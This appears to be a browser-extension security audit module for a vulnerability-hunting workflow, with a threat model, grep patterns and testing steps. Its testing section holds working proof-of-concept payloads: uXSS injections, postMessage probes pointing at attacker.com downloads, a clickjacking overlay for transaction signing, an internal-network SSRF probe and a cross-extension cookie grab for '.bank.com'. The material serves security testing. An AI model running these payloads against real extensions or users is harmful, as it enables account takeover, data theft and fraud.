# ASSET MODULE — Browser Extension
# Covers: Chrome, Firefox, Edge extensions (MV2 and MV3)
# Report ID prefix: EXT
# Note: "browserext" is the --asset flag; applies to all Chromium + Firefox extensions

## THREAT MODEL

A browser extension operates across multiple trust boundaries.
A malicious web page (attacker-controlled) can potentially:
  - Inject data into content scripts via DOM, postMessage, or page events
  - Escalate to privileged background APIs via message passing
  - Abuse web_accessible_resources to fingerprint, clickjack, or interact with the extension
  - Exploit remote config fetches via MITM or compromised CDN
  - Invoke sensitive Extension APIs (downloads, cookies, history, tabs) via confused-deputy chain
  - Communicate with background via inter-extension messaging if externally_connectable is open

Components and trust levels:
  manifest.json              → declares all permissions and boundaries
  background service worker  → privileged, full browser API access (MV3)
  background page            → privileged, full browser API access (MV2)
  content scripts            → injected into web pages, semi-trusted bridge
  popup / options pages      → extension origin, trusted
  web_accessible_resources   → files exposed to ALL web pages (WAR)

## BROWSER / MANIFEST VERSION DIFFERENCES

| Aspect | MV2 (Firefox) | MV2 (Chrome) | MV3 (Chrome/Edge) |
|---|---|---|---|
| CSP unsafe-eval | Allowed | Allowed | Deprecated/blocked |
| Script execution | `tabs.executeScript()` accepts strings | `tabs.executeScript()` accepts strings | `scripting.executeScript()` local files only |
| SSRF with cookies | No permissions needed | Requires host_permissions | Requires host_permissions |
| Host permissions key | `permissions` | `permissions` | `host_permissions` (separate) |
| Optional permissions | Not supported | Not supported | Supported (runtime consent) |
| New store submissions | Still accepted | Deprecated | Required |

**Firefox MV2 is the most dangerous**: allows `unsafe-eval`, `tabs.executeScript()` with string
code, and sends cookies on cross-origin requests even without declared permissions.

## VULNERABILITY CLASSES (priority order)

1.  Universal XSS (uXSS)               CWE-79   — content script injects attacker HTML into any page
2.  Privilege Escalation via Messages  CWE-269  — web page triggers browser privileged API via confused deputy
3.  Extension API Injection            CWE-94   — attacker-controlled data reaches chrome.* API call
4.  SSRF via Extension                 CWE-918  — extension fetches attacker-controlled URL (with cookies)
5.  Sensitive Data Leakage             CWE-200  — browsing data sent beyond privacy policy
6.  Remote Config Integrity            CWE-494  — config/blocklist fetched without integrity verification
7.  CSP Weakening                      CWE-693  — extension strips page CSP enabling downstream attacks
8.  web_accessible_resources Abuse     CWE-200/CWE-1021 — clickjacking or parameter injection via WAR
9.  Open Redirect / Tab Hijacking      CWE-601  — chrome.tabs.update with attacker-controlled URL
10. Extension Storage Tampering        CWE-915  — chrome.storage poisoned via message chain
11. Inter-Extension Messaging Attack   CWE-269  — externally_connectable misconfiguration
12. XSS in Extension Pages             CWE-79   — popup/options page XSS via unsafe DOM write

## WHITEBOX STATIC ANALYSIS

### Step 1 — Parse manifest.json
```bash
cat manifest.json | python3 -m json.tool
```
Check:
  - manifest_version: 2 or 3?
  - permissions: flag <all_urls>, tabs, cookies, scripting, nativeMessaging, history, topSites, browsingData
  - host_permissions (MV3): broad patterns like *://*/* or https://*/*
  - content_security_policy: flag unsafe-inline, unsafe-eval, external script-src
  - content_scripts[].matches: which pages are injected?
  - web_accessible_resources[].matches: "matches": ["<all_urls>"] = exposed to any page → WAR abuse
  - externally_connectable.matches: open patterns allow any site to reach background via sendMessage
  - externally_connectable.ids: "*" = any extension can call this extension
  - background: service_worker (MV3) vs scripts (MV2)
  - options_ui / popup: HTML pages that run in extension context

### Step 2 — Source grep patterns
```bash
# uXSS / DOM sinks
grep -rn "innerHTML\|outerHTML\|insertAdjacentHTML\|document\.write" --include="*.js"
grep -rn "\.html(\|jQuery.*html\b" --include="*.js"
# In popup/options HTML: look for innerHTML writes with data from chrome.storage or URL params

# Message handling — origin validation
grep -rn "addEventListener.*message\|onmessage\b" --include="*.js"
grep -rn "runtime\.onMessage\|runtime\.sendMessage\|onMessageExternal" --include="*.js"
grep -rn "\.origin\b\|sender\.url\|sender\.id\b" --include="*.js"
# Flag any message handler that does NOT check event.origin or sender.url

# Dynamic code execution (XSS + RCE)
grep -rn "eval(\|new Function(\|setTimeout.*['\"]" --include="*.js"
grep -rn "scripting\.executeScript\|tabs\.executeScript" --include="*.js"
# tabs.executeScript() with string code = XSS if attacker-controlled

# Extension API injection — sensitive API calls reachable from message handlers
grep -rn "downloads\.download\|tabs\.create\|tabs\.update\|scripting\.executeScript" --include="*.js"
grep -rn "cookies\.set\|cookies\.getAll\|history\.search\|topSites\.get\|bookmarks\." --include="*.js"
grep -rn "browsingData\.remove\|management\.\|proxy\.settings" --include="*.js"
# Trace: which of these are called INSIDE or REACHABLE from a message handler?

# SSRF — extension-initiated network requests
grep -rn "fetch(\|XMLHttpRequest\|xhr\.\|\.get(\|\.post(" --include="*.js"
# Check: is the URL attacker-controllable via message data?
# Check: does MV2 Firefox send cookies on cross-origin fetches?

# External fetches — remote config / blocklists
grep -rn "fetch(\|XMLHttpRequest" --include="*.js" -A3 | grep "http"
# List ALL remote URLs fetched — check for integrity verification (subresource integrity / hash comparison)

# Sensitive data
grep -rn "chrome\.cookies\|browser\.cookies\|document\.cookie" --include="*.js"
grep -rn "chrome\.history\|browser\.history\|chrome\.topSites\|browser\.topSites" --include="*.js"
grep -rn "password\|token\|api.key\|secret\|auth" --include="*.js" -i

# Navigation / tab control
grep -rn "chrome\.tabs\.update\|chrome\.tabs\.create\|chrome\.windows\.create" --include="*.js"
grep -rn "tabs\.update.*url\|tabs\.create.*url" --include="*.js" -A3
# Flag if URL comes from message data without validation

# Storage
grep -rn "chrome\.storage\|browser\.storage\|localStorage\|sessionStorage" --include="*.js"

# web_accessible_resources — URL parameter injection
# For each HTML file listed in web_accessible_resources, check if it reads URL params:
grep -rn "location\.search\|location\.hash\|URLSearchParams\|location\.href" --include="*.js"
# If a WAR HTML file reads URL params → potential iframe parameter injection attack

# externally_connectable — confused deputy
grep -rn "onMessageExternal\|onConnectExternal" --include="*.js"
# If present AND no sender.id whitelist check → any allowed origin/extension can call this
```

### Step 3 — DoubleX automated data flow analysis
```bash
# DoubleX: statically detects attacker-controlled data flows to sensitive APIs
# Best tool for finding content script → background API injection chains
git clone https://github.com/Aurore54F/DoubleX
cd DoubleX
pip3 install -r requirements.txt
cd src && npm install esprima escodegen && npm -g install js-beautify

# Analyze extension:
python3 src/doublex.py \
  -cs 'path/to/content_script.js' \
  -bp 'path/to/background.js'

# For Firefox extensions (not Chromium-based):
python3 src/doublex.py -cs content.js -bp background.js --not-chrome

# For Web Accessible Resources:
python3 src/doublex.py -cs content.js -bp war_page.js --war

# Output: analysis.json
# "dataflow": true → attacker-controllable data flows into sensitive API → INVESTIGATE
# Sensitive APIs tracked: eval, tabs.executeScript, downloads.download,
#   cookies.set, topSites.get, history.search, scripting.executeScript

# Unpack CRX if needed:
python3 src/unpack_extension.py -s 'extension.crx' -d 'unpacked/'
```

## DYNAMIC TESTING

### Setup
```bash
# Load unpacked extension
# Chrome → chrome://extensions → Developer mode ON → Load unpacked → select extension dir

# Debug background service worker
# Chrome → chrome://extensions → click "service worker" link → DevTools opens

# Debug content scripts
# Open any page → DevTools → Sources → Content scripts tab

# Unpack CRX (packed extension) for whitebox analysis:
python3 doublex/src/unpack_extension.py -s extension.crx -d ./unpacked/
```

### uXSS test template
```html
<!-- save as poc_uxss.html, serve locally, visit with extension active -->
<!DOCTYPE html>
<html>
<body>
<script>
// Attempt 1: URL fragment injection
// If extension reads location.hash and inserts into DOM:
// visit: poc_uxss.html#<img src=x onerror="alert(document.domain)">

// Attempt 2: postMessage to content script
window.postMessage({
  type: 'ddg:update',  // replace with actual message type from grep
  payload: '<img src=x onerror="alert(document.domain)">'
}, '*');

// Attempt 3: page title / meta injection
document.title = '<img src=x onerror="alert(document.domain)">';

// Confirmation: alert must show VICTIM DOMAIN (e.g., github.com), NOT chrome-extension://...
</script>
</body>
</html>
```

### Extension API Injection test

When content script forwards message data to a privileged API without validation:

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Probe: can we make the extension download a file?
window.postMessage({ type: 'download', url: 'https://attacker.com/malicious.exe' }, '*');

// Probe: can we open a tab to attacker-controlled URL?
window.postMessage({ type: 'openTab', url: 'https://attacker.com' }, '*');
window.postMessage({ action: 'navigate', target: 'https://attacker.com' }, '*');

// Probe: can we get the extension to call tabs.executeScript with our code?
window.postMessage({ type: 'exec', code: 'alert(document.domain)' }, '*');

// Probe: can we read/overwrite chrome.storage via message?
window.postMessage({ type: 'setStorage', key: 'apiKey', value: 'attacker-controlled' }, '*');
window.postMessage({ type: 'getStorage', key: 'authToken', callback: true }, '*');

// Monitor extension responses:
window.addEventListener('message', (e) => {
  if (e.origin.startsWith('chrome-extension://')) {
    console.log('[EXT RESPONSE — possible data leak]', e.data);
  }
});
</script>
</body>
</html>
```

### web_accessible_resources (WAR) attack

If an HTML file is listed in `web_accessible_resources` with `"<all_urls>"`:

```html
<!-- Attack 1: Parameter injection into WAR page via iframe -->
<!-- If WAR page reads location.search and uses it to call a privileged API: -->
<iframe src="chrome-extension://EXTENSION_ID/page.html?url=https://attacker.com&action=open">
</iframe>

<!-- Attack 2: Clickjacking via WAR iframe -->
<!-- WAR page has a button that triggers a privileged action (sign transaction, etc.) -->
<style>
  iframe { opacity: 0.01; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
  .decoy { position: absolute; top: 200px; left: 200px; }
</style>
<div class="decoy"><button>Click for free prize!</button></div>
<iframe src="chrome-extension://EXTENSION_ID/popup.html"></iframe>
<!-- Victim clicks decoy button, actually clicks "Confirm Transaction" in invisible iframe -->
```

**Real-world example**: MetaMask — overlay covers extension popup, victim unknowingly signs transaction.

### SSRF via extension-initiated fetch

```javascript
// From a page where the extension's content script is active,
// try to influence the URL of a fetch the extension will make:

// If extension fetches a URL from message data:
window.postMessage({
  type: 'fetchConfig',
  url: 'https://attacker.com/config.json'
}, '*');

// Or with internal network probing (extension fetches internal IPs with full cookie access on Firefox MV2):
window.postMessage({
  type: 'fetchPreview',
  url: 'http://192.168.1.1/admin'
}, '*');
```

### Inter-extension messaging (confused deputy)

```javascript
// From a malicious extension (attacker.ext), target a vulnerable extension:
const TARGET_EXT_ID = 'TARGET_EXTENSION_ID_HERE';

chrome.runtime.sendMessage(TARGET_EXT_ID,
  { type: 'getPrivateData', action: 'exportSettings' },
  (response) => {
    if (response) console.log('[Leaked from target ext]', response);
  }
);

// Or via connect (long-lived channel):
const port = chrome.runtime.connect(TARGET_EXT_ID, { name: "exploit" });
port.onMessage.addListener((msg) => console.log('[Data from target]', msg));
port.postMessage({ action: 'getCookies', domain: '.bank.com' });
```

### Remote config MITM test
```bash
# Run mitmproxy
mitmproxy --mode transparent --ssl-insecure

# Intercept the extension's config/blocklist fetch
# Return tampered JSON
# Observe: does extension accept it? Can you inject a malicious rule?
# Also check: is there any hash/signature verification of the fetched config?
```

### XSS in extension popup/options page
```bash
# If popup.html reads from chrome.storage and inserts into DOM:
# 1. As attacker page content script → poison chrome.storage:
chrome.storage.local.set({ displayName: '<img src=x onerror="alert(document.domain)">' });

# 2. Open extension popup → if XSS fires in popup → context is chrome-extension://
# In popup context XSS: can call chrome.* APIs directly → escalate to API injection
```

## KEY DISTINCTIONS — Bug vs Feature

Privacy bypass (extension fails to block a tracker):
  → Product bug, NOT a security vulnerability. Do not report.

Extension detectable by websites (web_accessible_resources fingerprinting):
  → Expected browser behavior. INFORMATIVE unless leads to real exploit (clickjacking, param injection).

Self-XSS in extension popup (user must type payload):
  → Out of scope.

uXSS confirmation requirement:
  → alert(document.domain) must show the VICTIM DOMAIN, not extension origin.
  → alert(1) in chrome-extension:// context = NOT a valid uXSS.
  → EXCEPTION: XSS in chrome-extension:// context IS valid if it lets you call chrome.* APIs
    directly (popup/options page XSS → API injection escalation).

Extension API injection (no code execution):
  → downloads.download() / cookies.set() with attacker-controlled data = High/Critical
  → Most API injection = denial of service or data theft, not RCE

Firefox MV2 SSRF:
  → Without host_permissions, Firefox MV2 extension can still send cookies cross-origin
  → Rate as High even without code exec if sensitive cookies are exfiltrated

WAR clickjacking:
  → Requires victim to actively click inside the invisible iframe
  → MetaMask-class findings (sign transaction, send funds) = Critical
  → Lower-impact actions (open settings, toggle feature) = Medium

---

## MANDATORY EVIDENCE CAPTURE — For every confirmed finding

Before writing a finding to REPORT_BUNDLE, you MUST collect:

### 1. Vulnerable Code Snippet
Read the exact lines from the source file.
Populate vulnerable_code_snippet with:
  - file: relative path from extension root
  - line_start / line_end: the exact line numbers
  - snippet: verbatim copy of the lines (no paraphrasing)
  - annotation: which specific line is the root cause and why

Example:
```json
{
  "file": "shared/bg/start-background-script.js",
  "line_start": 1,
  "line_end": 1,
  "snippet": "case\"openTab\":return p.openTab(r.url);",
  "annotation": "Line passes r.url directly to openTab() without any URL validation"
}
```

### 2. Attack Flow Diagram
For every finding, write a Mermaid diagram in attack_flow_diagram.
Choose the diagram type that best fits the vulnerability:

**For message-passing vulns** (postMessage, runtime.onMessage):
```
sequenceDiagram
    participant A as Attacker Page
    participant CS as Content Script
    participant BG as Background Script
    participant API as Chrome API
    A->>CS: window.postMessage({type:'openTab', url:'evil.com'})
    Note over CS: No event.origin check
    CS->>BG: chrome.runtime.sendMessage({type:'openTab', url:'evil.com'})
    Note over BG: No URL validation
    BG->>API: chrome.tabs.create({url:'evil.com'})
    API-->>A: New tab opens to attacker URL
```

**For uXSS vulns** (DOM injection):
```
flowchart LR
    A[Attacker controls\nURL fragment / postMessage] --> B[Content Script reads\nattacker data]
    B --> C[innerHTML assignment\non victim page]
    C --> D[Script executes in\nvictim origin context]
    D --> E[alert document.domain\nshows victim.com]
```

**For data leakage vulns**:
```
sequenceDiagram
    participant P as Victim Page
    participant CS as Content Script
    participant BG as Background Script
    participant EXT as External Server
    P->>CS: Page loads, content script active
    CS->>BG: Sends browsing data
    BG->>EXT: POST https://tracker.com/collect\n{url: full_url, userId: id}
```

### 3. PoC Channel Verification (REQUIRED before confirming)
For ANY message-based finding, explicitly trace the channel:
  □ What listener is registered in the code? (postMessage vs onMessage vs CustomEvent)
  □ Does the PoC trigger the correct channel?
  □ Do field names in PoC match the switch/case in the handler?
  □ Is there a relay from content script to background? Read the relay code.
  □ Does any origin/sender check guard the handler?

If you cannot confirm all 5 points: mark as unconfirmed, explain in reason_not_confirmed.

---

## ADDITIONAL VULN MODULES

| Vector | Module path | Auto-load trigger |
|---|---|---|
| postMessage / runtime.onMessage | asset/browserext/vuln/postmessage.md | addEventListener message OR onMessage found |
| npm supply chain (extension build) | shared/vuln/supply_chain.md | package.json present |

Auto-load triggers:
- If addEventListener message OR runtime.onMessage found → load postmessage.md
- If package.json present in extension root → load supply_chain.md
- If onMessageExternal OR externally_connectable in manifest → load postmessage.md (inter-extension section)
- If web_accessible_resources matches <all_urls> AND HTML files present → audit WAR pages for param injection + clickjacking

## TOOLS SUMMARY

```bash
# DoubleX — static data flow analysis for extensions (CCS'21)
# Detects attacker-controllable flows to sensitive APIs (eval, tabs.executeScript, downloads.download, etc.)
# https://github.com/Aurore54F/DoubleX
python3 src/doublex.py -cs content.js -bp background.js
# "dataflow": true in output → suspicious attacker-controlled flow confirmed

# Tarnish — automated Chrome extension security analysis
# https://github.com/nicowillis/tarnish (older but still useful)

# crxcavator / Extension Workshop security linter
# https://crxcavator.io — paste extension ID for risk score + permission analysis

# Chrome extension source viewer
# Install: "Chrome extension source viewer" from Web Store
# Lets you view extension source directly from the Chrome Web Store

# mitmproxy — intercept extension remote config/update fetches
mitmproxy --mode transparent --ssl-insecure
```
